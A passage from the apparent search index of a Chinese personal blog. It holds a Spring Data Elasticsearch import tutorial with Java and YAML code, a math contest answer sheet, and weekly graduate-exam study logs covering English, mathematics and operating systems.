3）、还可以使用@HandlesTypes，在应用启动的时候加载我们感兴趣的类； 流程： 1）、启动Tomcat 2）、org\\springframework\\spring-web\\4.3.14.RELEASE\\spring-web-4.3.14.RELEASE.jar!\\META-INF\\services\\javax.servlet.ServletContainerInitializer： Spring的web模块里面有这个文件：org.springframework.web.SpringServletContainerInitializer 3）、SpringServletContainerInitializer将@HandlesTypes(WebApplicationInitializer.class)标注的所有这个类型的类都传入到onStartup方法的Set","path":"2019/10/01/Spring Boot如何学习？/"},{"title":"基于SpringData Es对Elasticsearch进行操作","text":"基于SpringData Es对Elasticsearch进行操作基本环境的搭建 首先需要搭建Elasticsearch集群（参考如上，es1 es2 es3） 注意：这里在docker中创建elasticsearch容器的过程中，需要指定一定大小的ES_JAVA_OPTS=&quot;-Xms256m -Xmx256m&quot;值，否则后面在执行导入mysql数据表中数据到es索引库中会产生问题，建议设置为750m，将数据导入到索引库之后即可重新创建es1，将值设定为256m即可 创建changgou-service-search-api在pom.xml文件引入相关的依赖 1234567891011&lt;!--goods API依赖，等会要调用goods服务中的SkuFeign来查询所有的sku。api中除了写pojo外，还要写feign--&gt;&lt;dependency&gt; &lt;groupId&gt;com.muzimz.changgou&lt;/groupId&gt; &lt;artifactId&gt;changgou-service-goods-api&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;&lt;/dependency&gt;&lt;!--SpringDataES依赖--&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-elasticsearch&lt;/artifactId&gt;&lt;/dependency&gt; 创建changgou-service-search工程，并进行如下操作 在pom.xml中引入相关的依赖1234567&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.muzimz.changgou&lt;/groupId&gt; &lt;artifactId&gt;changgou-service-search-api&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 在com.changgou中创建SearchApplication.java启动类12345678910111213141516171819202122232425package com.changgou;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration;import org.springframework.cloud.netflix.eureka.EnableEurekaClient;import org.springframework.cloud.openfeign.EnableFeignClients;import org.springframework.data.elasticsearch.repository.config.EnableElasticsearchRepositories;@SpringBootApplication(exclude=&#123;DataSourceAutoConfiguration.class&#125;) //禁用数据库的加载@EnableEurekaClient@EnableFeignClients(basePackages = \"com.changgou.goods.feign\") //开启Feign的调用@EnableElasticsearchRepositories(basePackages = \"com.changgou.search.dao\") // 开启elasticsearch的包扫描public class SearchApplication &#123; public static void main(String[] args) &#123; /** * Springboot整合Elasticsearch 在项目启动前设置一下的属性，防止报错 * 解决netty冲突后初始化client时还会抛出异常 * availableProcessors is already set to [12], rejecting [12] ***/ System.setProperty(\"es.set.netty.runtime.available.processors\", \"false\"); SpringApplication.run(SearchApplication.class,args); &#125;&#125; 创建application.yml文件，并进行如下配置123456789101112131415161718192021222324252627282930313233343536373839server: port: 19085spring: application: name: search data: elasticsearch: cluster-name: elasticsearch # es集群的名字，在elasticsearch.yml中有定义 cluster-nodes: 192.168.220.201:9300 # 注意这里是9300端口，而不是9200,9300指的是elasticsearch的Tcp通信端口，而9200是http请求端口，通过docker ps可看出9300tcp端口 repositories: enabled: true main: allow-bean-definition-overriding: trueeureka: client: service-url: defaultZone: http://127.0.0.1:6868/eureka instance: prefer-ip-address: truefeign: hystrix: enabled: true#超时配置ribbon: ReadTimeout: 3000000hystrix: command: default: execution: timeout: #如果enabled设置为false，则请求超时交给ribbon控制 enabled: true isolation: thread: timeoutInMilliseconds: 100000000 strategy: SEMAPHORE 将数据导入索引库数据导入流程：1、请求serch服务，调用数据导入地址2、根据注册中心中的注册的goods服务的地址，使用Feign方式查询所有已经审核的sku3、使用SpringData es将查询到的sku集合导入到es中 实现过程：1、创建一个javabean（skuinfo）中添加索引库映射配置2、创建Feign，实现查询所有sku集合3、在搜索微服务中调用Feign，查询所有sku集合，并且将sku集合转化成skuinfo集合4、Controller-》service-》dao（继承ElasticsearchRepository）实现数据导入到es中 在changgou-service-search-api中的com.changgou.search.pojo中创建SkuInfo.java实体类，用于对es数据的封装 在这个类中需要指定导入索引库的名称和类型，以及各个字段的数据类型（text、double等），以及是否需要支持ik分词等12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879package com.changgou.search.pojo;import org.springframework.data.annotation.Id;import org.springframework.data.elasticsearch.annotations.Document;import org.springframework.data.elasticsearch.annotations.Field;import org.springframework.data.elasticsearch.annotations.FieldType;import java.io.Serializable;import java.util.Date;import java.util.Map;@Document(indexName = \"skuinfo\",type = \"docs\") // 用于指定索引名称和类型名称public class SkuInfo implements Serializable &#123; //商品id，同时也是商品编号 @Id private Long id; /*** * SKU名称 * type = FieldType.Text:类型，Text支持分词 * index = true:添加数据的时候，是否分词 * analyzer = \"ik_smart\":创建索引的分词器 * store = false:是否存储 * searchAnalyzer = \"ik_smart\":搜索时候使用的分词器 */ @Field(type = FieldType.Text, analyzer = \"ik_smart\",index = true,store = false,searchAnalyzer = \"ik_smart\") private String name; //商品价格，单位为：元 @Field(type = FieldType.Double) private Long price; //库存数量 private Integer num; //商品图片 private String image; //商品状态，1-正常，2-下架，3-删除 private String status; //创建时间 private Date createTime; //更新时间 private Date updateTime; //是否默认 private String isDefault; //SPUID private Long spuId; //类目ID private Long categoryId; /**** * 类目名称 * type = FieldType.Keyword:不分词 */ @Field(type = FieldType.Keyword) private String categoryName; /*** * 品牌名称 * type = FieldType.Keyword:不分词 */ @Field(type = FieldType.Keyword) private String brandName; //规格 private String spec; //Map(String)-&gt;Map类型 //规格参数 private Map&lt;String,Object&gt; specMap; //setter、getter&#125; 在changgou-service-goods-api中的com.changgou.goods.feign下创建SkuFeign.java 该类中指定需要调用service-goods服务中SkuController.java中的哪个方法（哪个接口），并且需要注意以下几个问题：1、@Feign：指定需要调用的服务名，在服务中对应的application.yml会配置服务name2、@RequestMapping：同controller一样，需要配置映射路径3、无论是映射路径、还是方法名、还是返回值最好都要和controller相一致123456789101112131415161718package com.changgou.goods.feign;import java.util.List;import org.springframework.cloud.openfeign.FeignClient;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import com.changgou.entity.Result;import com.changgou.goods.pojo.Sku;@FeignClient(name=\"goods\") // 调用goods微服务中的control，是name不是value@RequestMapping(\"/sku\")public interface SkuFeign &#123; @GetMapping Result&lt;List&lt;Sku&gt;&gt; findAll();&#125; 开始写changgou-service-search SkuEsMapper.java，需要继承ElasticsearchRepository，用于调用saveAll方法将数据保存至es索引库中12345678910package com.changgou.search.dao;import org.springframework.data.elasticsearch.repository.ElasticsearchRepository;import org.springframework.stereotype.Repository;import com.changgou.search.pojo.SkuInfo;@Repositorypublic interface SkuEsMapper extends ElasticsearchRepository&lt;SkuInfo, Long&gt; &#123;&#125; SkuEsService.java1void importData(); SkuEsServiceImpl.java，implements SkuEsService 注意@Service注解，可自动注入至controller1234567891011121314151617181920212223@Autowired // 通过自动注入Feign，来调用goods服务中的controller来查询数据private SkuFeign skuFeign;@Autowired // 该mapper中继承了ElasticsearchRepository，可对数据保存至es索引库中private SkuEsMapper skuEsMapper;/** * 将数据库中的数据导入es索引库 */@Overridepublic void importData() &#123; // 调用Feign，查询List&lt;Sku&gt; Result&lt;List&lt;Sku&gt;&gt; skuResult = skuFeign.findAll(); // 将LIst&lt;Sku&gt;转成List&lt;SkuInfo&gt; List&lt;SkuInfo&gt; skuInfoList = JSON.parseArray(JSON.toJSONString(skuResult.getData()), SkuInfo.class); for (SkuInfo skuInfo: skuInfoList) &#123; // 获取spec -&gt; Map(String)-&gt;Map类型 Map&lt;String, Object&gt; specMap = JSON.parseObject(skuInfo.getSpec(), Map.class); skuInfo.setSpecMap(specMap); &#125; // 调用Dao实现数据批量导入 skuEsMapper.saveAll(skuInfoList);&#125; SkuEsController.java1234567891011121314@RestController@CrossOrigin@RequestMapping(value=\"/search\") public class SkuEsController &#123; @Autowired private SkuService skuService; @GetMapping(value=\"/import\") public Result importData() &#123; skuService.importData(); return new Result(true, StatusCode.OK, \"执行操作成功\"); &#125;&#125; 执行，数据导入 在chrom浏览器中访问：localhost:19085/search/import即可开始将数据库中tb_sku表中的数据导入到es索引库中","path":"2019/08/03/基于SpringData Es对Elasticsearch进行操作/"},{"title":"阿里数学预赛答卷","text":"阿里数学预赛答卷**第一题**A题问：小明打算在这家店铺买一款250块的耳机和一款600块的音响，怎么买划算？答：由题意可知，店铺优惠券每单可叠加使用，全场优惠券每单限一张，对于该问题我们主要分两种情况讨论： 第一种：两种商品一单购买 使用凑单： 设订单总价为W,凑单价为p,店铺优惠券数为n \\\\ n = [\\frac{850}{60}]+1=15 \\\\ p=60-[\\frac{850}{60}]=50 \\\\ W = 250+600+50-15\\times5-60=765块不使用凑单： n = [\\frac{850}{60}]=14 \\\\ W = 250+600-14\\times5-60=720块 第二种：两种商品分两单购买 耳机： n_1=[\\frac{250}{60}]+1=5 \\\\ W_{耳1}=250+50-5\\times5-60=215块 \\\\ n_2 = [\\frac{250}{60}]=4\\\\ W_{耳2}=250-4\\times5=230块音箱： n=[\\frac{600}{60}]=10 \\\\ W_音 = 600-5\\times10-60=490块 W=W_{耳1}+W_{音}=705块综合所述：小明耳机和音箱应该分开购买，且购买耳机时在其他商店凑单50块，购买音箱时不需要凑单，这种购买方式最为划算，总价为$705块$。 B题B1题：问：x至少等于多少时，小明在您的店铺买耳机和音箱其中一种会更便宜？答：小明购买耳机： 250+49-x-60-215=-1 \\\\ x=25小明购买音箱： 600-x-60-490=-1 \\\\ x=51 ∵\\ 25","path":"2019/07/02/阿里数学预赛答卷/"},{"title":"随写录4（4.29-5.05）","text":"我们总是喜欢拿“顺其自然”来敷衍人生道路上的荆棘坎坷，却很少承认，真正的顺其自然，其实是竭尽所能之后的不强求，而非两手一摊的不作为。 —— 瑞卡斯Ricas 现在是2019年5月6日，距离2020考研还有230天。这是Log的第四周，长达五天小长假的五一节已经过去了，五一基本上是这个学期最长的假期了，在此之后基本上就要迎接期末的到来了。这个假期总的来说不是那么尽如人意，在英语方面花了大量的时间，尤其是在单词（《恋练有词》）上的学习，以致于这周都没时间放在408上。之后通过知乎了解到前学长学姐对韦林课程的负面评价之后，心中有了些许小小的波动。可见：如何评价朱伟以及他的韦林？。自身在逐渐学习2019年版《恋练有词》这门课程时，也和大多数知乎上的答主感同身受，所以后期的打算是《恋练有词》会继续跟下去，但是可能会进一步加快进度，否则没有太多时间留给数学和专业课。 当然，上帝为你关上一扇门的同时也会为你打开一扇窗。虽然在单词上面不是很满意，但是在英语阅读理解上面却自我感觉有了不小的提高，这进一步增强了对英语的信心。以前的自己在做阅读理解的过程中总是会有文章逻辑理不清、长难句读不懂、二选一完美避开正确选项等问题，对待阅读常常会有一种恐惧心理。但现在对待阅读理解的态度的确有了一个较大的逆转，会以一种积极向上的态度去学习，甚至发现阅读理解也有其中的乐趣可言，而并非想象中的那么枯燥乏味。在这段阅读理解的学习过程中，也总结出了适合自己的做题方法： 先快速阅读五道题，明白题目问的是什么，然后尝试着得到本篇文章中心论点（关键词），时间允许的话快速扫描一下选项，观察是否存在共同点 带着题干中总结出的关键词快速阅读全文中每个段落的首尾句，然后尽力理清作者的写作思路以及态度，得到全文的中心论据（主要是讲的一个什么东西），并且对文章的结构加以短暂的分析，比如说：全文是总分的形式还是总分总，首段是不是按照以例子来引出中心论据的套路等 在以上两步完成的情况下，接着就是剑鞘直击题目了，通过常用的定位方法以及前两步骤对文章的了解应该可以快速在文章中得到对应题目的定位了。 定位好之后就是逐个比较，如果确定了那就一锤定音直击正确选项，如果不确定就需要回到原文不断的比较排除，最终根据自认为可信度最高的选项走。 当然，我也明白：方法是死的人是活的，在确定了适合自己方法之后，还是需要一定的题量支持，不断的去强化自己并加以总结以完善自己的做题方式，朝着更高的正确率前进。 Log内容 本周复习状况 下周复习计划 本周复习状况英语周周长难句： This success, coupled with later research showing that memory itself is not genetically determined, led Ericsson to conclude that the act of memorizing is more of a cognitive exercise than an intuitive one,这种成功和后来的表明记忆本身并不是先天决定的研究使艾瑞克森总结道：记忆的行为与其说是一种先天的行为，倒不如说是一种习得的行为。 ① 主语是this success，谓语是led，宾语是Ericsson，不定式to conclude作状语 ② research后劲的现在分词作后置定语，that引导的从句作showing的宾语，more...than...为与其说...倒不如说 重要词：coupled with： 相当于and，类似的还有along with，combile with，表伴随cognitive：认知的intuitive：决定的 数学 Q1: 设 A=\\left[ \\begin{matrix} 1 & -1 & -1 & -1\\\\ -1 & 1 & -1 & -1\\\\ -1 & -1 & 1 & -1\\\\ -1 & -1 & -1 & 1\\\\ \\end{matrix} \\right]，$f(x)=x^3-2x+5$，问$B=f(A)$能否相似与对角阵，说明理由？若能相似于对角阵，求可逆阵$P$，使得$P^-BP=\\Lambda$ 分析：这是一道关于线性代数的题。首先，我们根据给出的矩阵$A$可以得到它的特征值以及对应的特征向量，根据求解的结果我们可以直接得到$B=f(A)$的特征值和对应的特征向量，最后通过特征向量组合成基础解系即可求解出可逆矩阵$P$。在这里，中点主要在于$B$特征值和特征矩阵的求解，我们直接将$A$的特征值作为自变量分别带入函数$f(x)$中，然后即可得到$B$矩阵的特征值，而基础解系在变换的过程中不会发生变化。 解： $$ |A-\\lambda E|=\\left[ \\begin{matrix} 1-\\lambda & -1 & -1 & -1\\\\ -1 & 1-\\lambda & -1 & -1\\\\ -1 & -1 & 1-\\lambda & -1\\\\ -1 & -1 & -1 & 1-\\lambda\\\\ \\end{matrix} \\right]=-(\\lambda+2)(\\lambda-2)^3 $$ 求解得到矩阵$A$特征值分别为$\\lambda_1=-2，\\lambda_2=\\lambda_3=2$ ① 当$\\lambda_1=-2$时，解得对应的特征向量为$\\alpha_1=[1,1,1,1]^T$ ② 当$\\lambda_2=\\lambda_3$时，解得对应的无关特征向量为， $$ \\alpha_2=[1,-1,0,0]^T \\\\ \\alpha_3=[1,0,-1,0]^T \\\\ \\alpha_4=[1,0,0,-1]^T \\\\ $$ 因为$f(A)\\alpha=B\\alpha=f(\\lambda)\\alpha$，所以$B=f(A)=A^3-2A+5E$，且其特征值分别如下， $$ f(\\lambda_1)=f(-2)=1 \\\\ f(\\lambda_2)=f(\\lambda_3)=f(\\lambda_4)=9 $$ 且最终$B$的对应的特征向量依然为$\\alpha_1,\\alpha_2,\\alpha_3，\\alpha_4$，即$B$可相似于对角阵，且得到可逆矩阵$P$和$\\Lambda$分别如下， $$ \\Lambda=\\left[ \\begin{matrix} 1 & & & \\\\ & 9 & & \\\\ & & 9 & \\\\ & & & 9\\\\ \\end{matrix} \\right]， P=[\\alpha_1,\\alpha_2，\\alpha_3，\\alpha_4]=\\left[ \\begin{matrix} 1 & 1 & 1 & 1\\\\ 1 & -1 & 0 & 0\\\\ 1 & 0 & -1 & 0\\\\ 1 & 0 & 0 & -1\\\\ \\end{matrix} \\right] $$ > Q2易错题：在伯努利实验中，每次实验成功的概率为$p$，求在第n次成功之前恰失败了m次的概率 这道题本身并不难，但是在审题的过程中如果马虎且最求速度的话很容易就会出错，命题人玩的是一个文字游戏。通过题中描述：第n次成功之前恰失败了m次的概率，我们可以得到以下几个重要的信息： 总共是n+m次试验，且第n+m次试验是成功的 在第n+m次试验之前，即n+m-1次试验中，总共失败了m次 所以在解题的过程中以上两段需要单独拿出来求解，而不是常见的$C_{n+m}^n$ 解： P=C_{n+m-1}^{n-1}p^{n-1}(1-p)^m \\cdot p=C_{n+m-1}^{n-1}p^{n}(1-p)^m 常见变量的数字期望和方差，尤其注意分布的代表符号：① 二项分布，$X\\sim B&lt;/font&gt;(n, p)$，且$E(X)，D(X)=np(1-p)$② 泊松分布，$X\\sim P(\\lambda)$，且$E(X)=\\lambda，D(X)=\\lambda$③ 均匀分布，$X\\sim U(a, b)$，且$E(X)=\\frac{a+b}{2}，D(X)=\\frac{(b-a)^2}{12}$④ 指数分布，$X\\sim E(\\lambda)$，且$E(X)=\\frac{1}{\\lambda}，D(X)=\\frac{1}{\\lambda^2}$⑤ 正态分布（高斯分布），$X=N(\\mu, \\sigma^2)$，且$E(X)=\\mu，D(X)=\\sigma^2$ 下周复习计划 通过这个假期的训练，现在的阅读理解的正确率基本上在75%左右。《恋练有词》目前已经学到Unit10了，还剩下20个Unit，之后打算每天两小时，并在20天左右完成这一轮单词的学习。 数学这周将全书中的概率论和线性代数复习完了，并且将每节的例题和课后习题完成了，下周准备准备复习高等数学部分，依然是继续刷题 408下周完成操作系统的复习 2018-05-06,By 木子","path":"2019/05/06/随写录4（4.29-5.05）/"},{"title":"随写录3（4.22-4.28）","text":"总有一天你将破蛹而出，成长得比热门期待的还要美丽。 但这个过程会很痛，会很辛苦，有时候还会觉得灰心。 面对着汹涌而来的现实，觉得自己渺小无力。 但这，也是生命的一部分。做好现在你能做的，然后，一切都会好的。 我们都将孤独的长大，不要害怕。 —— 寂地 《踮脚张望的时光》 现在是2019年4月29日，距离2020考研还有237天。这是Log的第三周，上周学校举行了运动会，所以除了周末之外，多放了一天假 ┗|｀O′|┛ 嗷~~，所以复习的进度稍微推进了一点。不过很遗憾，和往年一样，这次的运动会我并没有参加任何的项目，但同时这也警醒了我，在复习期间需要一定运动的支持，才能进一步提高复习的效率，毕竟毛泽东同志说过：“身体的革命的本钱“。所以，在后期复习期间会添加一个晨跑的环节，时间定在5:50am - 6:20am，没有特殊情况下希望自己能说到做到，不要给懒惰滋生的机会。另外，后天就是五一劳动节了，总共会有五天的小长假，意味着这周基本上都是在五一中度过了，这么长的假期相当来之不易，所以需要好好规划下这周的任务。 Log内容 本周复习状况 下周复习计划 本周复习状况本周在网上购买了不少现在以及后期需要使用到的书，主要有如下： 《阅读的逻辑》 唐迟 江西美术出版社 《恋练有词》 朱伟、唐迟 群言出版社 《长难句解析》何凯文 中国原子能出版社 《英语历年真题全解》点知命题组 电子科技大学 《2020高分写作》 王江涛 群言出版社 《复习全书、660题、真题》 李永乐、王式安、武忠祥 国家行政学院出版社 《2020李林精讲精练880题 数学一》李林 中国人民大学出版社 《2020李林冲刺六套卷、终极预测四套卷》 李林 国家开放大学出版社 《2020汤家凤1800题》 汤家凤 中国原子能出版社 其中《2020李林精讲精练880题数学一》和《2020李林冲刺六套卷、终极预测四套卷》是属于预售书，需要到两个月左右才能发货，预售比较便宜所以就先买了；《2020汤家凤1800题》这本书还在运输过程中，预计明天到达。 英语英语方面，现在除了纯背单词之外，每天还在跟着朱伟视频学习恋练有词，感觉现在准备练练有词太花时间了，没课的情况下（周末）每天基本上要花费近五个小时。之后也在知乎、贴吧上找了上岸的学长学姐的经验，结果是褒贬不一。不管怎么样，既然《恋练有词》这门课程已经开始了，还是打算看完跟着视频走下去、尽量做到物有所值，把该做的笔记都做上，目前的目标是暑假前将视频学习完，并且自行重新梳理一遍。 周周长难句： Rosenberg argues convinvcingly that public-health advocates ought to take a page from advertisers, so skilled at applying peer pressure.罗森伯格的观点颇具说服力：公共健康倡导者应向广告商学习，因他们擅长运用同辈压力。 ① 主干：主谓宾 | that 为宾语从句 | 注意ought to整体作情态动词 相当于should ② 修饰：形容词skilled作定语 解释advertisers ③ 改写：adverstisers who are so skilled at 重要单词：convincing： 令人信服的advocate： 提倡、拥护、提倡者take a page from： 向…学习employ、exploit、deploy、exert、utilize、apply：应用 数学 计算曲面积分 \\ooint_E\\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\\frac{3}{2}}}其中$E$是曲面 $2x^2+2 y^2+z^2=4$ 的外侧。 1234567891011121314# 批注PS:# 这里有个技巧需要记录一下，在使用Latex的过程中，是没有直接给出二类曲面积分的书写的# 所以，我们需要自行定义，定义之后直接使用即可，其中定义方式如下：\\def\\ooint&#123;&#123;\\bigcirc&#125;\\kern-11.5pt&#123;\\int&#125;\\kern-6.5pt&#123;\\int&#125;&#125;\\def\\oooint&#123;&#123;\\bigcirc&#125;\\kern-12.3pt&#123;\\int&#125;\\kern-7pt&#123;\\int&#125;\\kern-7pt&#123;\\int&#125;&#125;# 使用方式如下：I= \\def\\ooint&#123;&#123;\\bigcirc&#125;\\kern-11.5pt&#123;\\int&#125;\\kern-6.5pt&#123;\\int&#125;&#125;\\def\\oooint&#123;&#123;\\bigcirc&#125;\\kern-12.3pt&#123;\\int&#125;\\kern-7pt&#123;\\int&#125;\\kern-7pt&#123;\\int&#125;&#125;\\ooint_E\\frac&#123;xdydz+ydzdx+zdxdy&#125;&#123;x^2+y^2+z^2&#125;# 如此使用之后即可渲染出上式。 这是2009年的数学一的一道真题，总体思路与常无异，但这里有个地方值得注意。使用高斯公式之后将曲面积分转化为三重积分之后，我们可以发现圆点在积分区域之内，然而在等式原曲面积分中圆点是一个特殊点，所以在这需要将圆点单独考虑。即构造一个小球面 $E_1=x^2+y^2+z^2=\\varepsilon^2 (\\varepsilon \\to 0)$，取其内侧。之后我们即可将构造好的积分区域作为新的区域，且构造的原因就是将圆点的特殊情况排除在外，将新的区域减去 $E_1$ 区域即可求得原第二类曲面积分值，解法如下： \\ooint_E\\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\\frac{3}{2}}}=\\ooint_{E+E_1}\\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\\frac{3}{2}}}-\\ooint_{E_1}\\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\\frac{3}{2}}} \\begin{align} I_1 & = \\ooint_{E_1}\\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\\frac{3}{2}}} \\\\ & = \\frac{1}{\\varepsilon^3}\\ooint_{E_1}xdxdz+ydzdx+zdxdy \\\\ &=-\\frac{1}{\\varepsilon^3}\\iiint_{\\Omega_1}3dxdydz \\\\ &=-\\frac{3}{\\varepsilon^3}\\frac{4\\pi\\varepsilon^3}{3}=-4\\pi \\end{align} \\begin{align} I_2 & = \\ooint_{E+E_1}\\frac{xdydz+ydzdx+zdxdy}{(x^2+y^2+z^2)^{\\frac{3}{2}}} \\\\ & = \\iiint_{\\Omega}[\\frac{\\partial}{\\partial x}(\\frac{x}{(x^2+y^2+z^2)^\\frac{3}{2}})+\\frac{\\partial}{\\partial x}(\\frac{y}{(x^2+y^2+z^2)^\\frac{3}{2}})+\\frac{\\partial}{\\partial x}(\\frac{z}{(x^2+y^2+z^2)^\\frac{3}{2}})]dxdydz \\\\ &=\\iiint_\\Omega 0 dxdydz=0 \\end{align} I=I_2-I_1=4\\pi12345678910111213141516171819202122# Latex源码\\def\\ooint&#123;&#123;\\bigcirc&#125;\\kern-11.5pt&#123;\\int&#125;\\kern-6.5pt&#123;\\int&#125;&#125;\\def\\oooint&#123;&#123;\\bigcirc&#125;\\kern-12.3pt&#123;\\int&#125;\\kern-7pt&#123;\\int&#125;\\kern-7pt&#123;\\int&#125;&#125;\\ooint_E\\frac&#123;xdydz+ydzdx+zdxdy&#125;&#123;(x^2+y^2+z^2)^&#123;\\frac&#123;3&#125;&#123;2&#125;&#125;&#125;=\\ooint_&#123;E+E_1&#125;\\frac&#123;xdydz+ydzdx+zdxdy&#125;&#123;(x^2+y^2+z^2)^&#123;\\frac&#123;3&#125;&#123;2&#125;&#125;&#125;-\\ooint_&#123;E_1&#125;\\frac&#123;xdydz+ydzdx+zdxdy&#125;&#123;(x^2+y^2+z^2)^&#123;\\frac&#123;3&#125;&#123;2&#125;&#125;&#125;\\begin&#123;align&#125; I_1&amp; = \\ooint_&#123;E_1&#125;\\frac&#123;xdydz+ydzdx+zdxdy&#125;&#123;(x^2+y^2+z^2)^&#123;\\frac&#123;3&#125;&#123;2&#125;&#125;&#125; \\\\&amp; = \\frac&#123;1&#125;&#123;\\varepsilon^3&#125;\\ooint_&#123;E_1&#125;xdxdz+ydzdx+zdxdy \\\\&amp;=-\\frac&#123;1&#125;&#123;\\varepsilon^3&#125;\\iiint_&#123;\\Omega_1&#125;3dxdydz \\\\&amp;=-\\frac&#123;3&#125;&#123;\\varepsilon^3&#125;\\frac&#123;4\\pi\\varepsilon^3&#125;&#123;3&#125;=-4\\pi \\end&#123;align&#125; \\begin&#123;align&#125; I_2&amp; = \\ooint_&#123;E+E_1&#125;\\frac&#123;xdydz+ydzdx+zdxdy&#125;&#123;(x^2+y^2+z^2)^&#123;\\frac&#123;3&#125;&#123;2&#125;&#125;&#125; \\\\&amp; = \\iiint_&#123;\\Omega&#125;[\\frac&#123;\\partial&#125;&#123;\\partial x&#125;(\\frac&#123;x&#125;&#123;(x^2+y^2+z^2)^\\frac&#123;3&#125;&#123;2&#125;&#125;)+\\frac&#123;\\partial&#125;&#123;\\partial x&#125;(\\frac&#123;y&#125;&#123;(x^2+y^2+z^2)^\\frac&#123;3&#125;&#123;2&#125;&#125;)+\\frac&#123;\\partial&#125;&#123;\\partial x&#125;(\\frac&#123;z&#125;&#123;(x^2+y^2+z^2)^\\frac&#123;3&#125;&#123;2&#125;&#125;)]dxdydz \\\\&amp;=\\iiint_\\Omega 0 dxdydz=0 \\end&#123;align&#125; I=I_2-I_1=4\\pi 408 并发是指两个或多个时间在同一时间间隔内发生，而并行是指在同一时刻，这一点需要格外注意。 命令接口主要有联机命令接口（交互式命令接口）和脱机命令接口（批处理命令接口），其中联机特点是执行一条命令汇报一条，而脱机是直接全部执行。另外，批处理无法进行人机交互。 程序接口由一组系统调用命令组成，简称系统调用，需要注意它的其他别名：广义指令 特权指令是指不允许用户直接使用的指令，以下几个需要强烈记忆：I/O指令、置中断指令、保护内存的寄存器、送程序状态字的指令。 防管指令（trap指令、陷入指令）只在用户态下使用，而执行防管指令则将会由用户态向核心态转换。所以说用户态下可以发生系统调用但是不能执行系统调用，且核心态下CPU可以执行除防管指令之外的全部指令 进程的调度是由操作系统完成，不需要硬件的支持，用户态到核心态的转化需要硬件的支持 进程进程实体（进程映像）的运行过程，是系统进行资源分配和调度的一个独立单位。其中，进程与进程映像（进程实体、程序）的根本区别是进程是动态的，而其他是静态的。 进程中，运行态 -&gt; 阻塞态（等待态）是主动的，阻塞态 -&gt; 就绪态是被动的，需要其他进程的协助 进程的创建过程：①申请PCB ②分配资源（内存）③初始化PCB ④进入就绪队列，等待CPU执行。一般来讲先有资源的调度，再有进程的切换 多个进程可以运行同一个程序 同一个程序经过多次创建，运行在不同的数据集上，形成了（A）的进程A：不同 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;B：相同&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; C：同步&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D：互斥PS：运行在不同的数据集，将会形成不同的进程 系统动态DLL库中的系统线程，被不同的进程所调用，它们是（B）的线程A：不同&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; B：相同 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;C：可能不同，也可能相同&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; D：不能被调用PS：程序代码经过多次创建可以对应不同的进程，而同一个系统的进程可以由系统调用的方法被不同的进程使用 引入线程之后，进程是除CPU外的系统资源的分配单位，而线程是处理机（CPU）的分配单位。线程可以分为用户级线程和内核级线程，且只有内核级线程才是处理机分配的单位 临界区是访问临界资源的那段代码，而临界资源是一个时间段内只允许一个进程使用的资源（需要互斥访问） 调度评价准则：① CPU利用率 \\eta=\\frac{T_{忙}}{T_{总}}，T_{总}=T_{忙}+T_{I/O}② 系统吞吐率 \\omega=\\frac{总作业数}{总时间数}③ 周转时间 周转时间=作业完成时间-作业提交时间④ 带权周转时间 带权周转时间=\\frac{作业周转时间}{作业实际运行时间}=\\frac{T_{周}}{T_{运}}④ 等待时间 等待时间=周转时间-运行时间-I/O操作时间以上是进程调度的常用评价标准，理解性记忆就行了 进程调度算法……（注意英文简称）在优先级调度算法中（Priority Scheduleily）中，需要注意常见的优先级关系 进程优先级 \\begin{cases} 系统进程 > 用户进程\\\\ 交互性进程 > 非交互性进程\\\\ I/O型进程 > 计算型进程（CPU）\\\\ \\end{cases}在高响应比有限调度算法（Hightest Response_ratio Next）中，需要注意响应比的计算 响应比=\\frac{等待时间+要求服务时间}{要求服务时间} 进程同步互斥章节中，需要尤其复习全面（很重要） 死锁是多个进程争夺资源而造成的一种僵局（互相等待），若无外力作用，这种局面将会一直保持下去。死锁处理主要有三个方面：死锁预防、死锁避免、死锁的检测和解除。 死锁预防是破坏一个或几个死锁产生的必要条件，死锁避免是放置进入不安全的状态（银行家算法），死锁检测和解除可以允许死锁，死锁后检测并解除。 下周复习计划 英语词汇继续复习，并且适当的收集往年真题中的生词及词组，在词汇的学习中适当观看恋练有词的配套视频，继续坚持每天两篇阅读的进度 数学没什么好说的，基本适当刷题的状态 408下周继续复习《操作系统》，将剩下的三个章节复习完","path":"2019/04/29/随写录3（4.22-4.28）/"},{"title":"随写录2（4.15-4.21）","text":"志向是天才的幼苗，经过热爱劳动的双手培育，在肥田沃土里将成长为粗壮的大树。不热爱劳动，不进行自我教育，志向这棵幼苗也会连根枯死。确定个人志向，选好专业，这是幸福的源泉。 —— 苏霍姆林斯基 